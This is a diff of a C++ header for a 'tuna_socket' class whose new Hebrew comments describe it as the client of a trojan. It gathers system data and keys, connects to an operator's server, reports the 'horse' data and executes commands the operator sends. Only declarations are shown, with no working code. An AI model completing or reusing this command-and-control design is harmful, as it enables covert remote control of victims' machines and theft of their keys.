@@ -12,19 +12,41 @@ public:
 	// init object
 	tuna_socket();
 
-	// create setting socket
+	// ---
+	// ממלא קבועים במידע לגבי המערכת, מפתחות, ועוד
+	// ---
 	int create_set_sock();
-	// connect
+	
+	// ---
+	// מעטפת לפונקציות לחיבור לשרת המפעיל
+	// param error: קוד שגיאה שמשמש לפעולות לוגיות
+	// ---
 	int connect(int error = 10060);
-	// send protocol to server
+	
+	// ---
+	// שליחת מבנה על פי הפרוטוקול שמכיל את נתוני הסוס, הגדרות, מפתחות, ודברים שישמשו 
+	// את גרפיקת המפעיל ואוטומציות בהקשר לנתונים של הסוס
+	// ---
 	void send_protocol();
-	// set setting
+	
+	// ---
+	// חיבור לשרת הראשי, הורדת נתוני המפעיל
+	// ---
 	bool set_setting();
-	// get packet & decrypt binary
+	
+	// ---
+	// מעטפת לקריאה (לא כתיבה)על גבי השקע הראשי שממתין לפקודות מהמפעיל
+	// ---
 	pair<json, char*>  get_packet_p();
-	// send 
+	
+	// ---
+	// שליחת נתונים על גבי השקע הראשי להחזר לצד המפעיל
+	// ---
 	void send_packet_p(char*, size_t);
 
+	// ---
+	// ניקוי כללי וסגירת כל החיבורים
+	// ---
 	void tunas_cleanup();
 
 
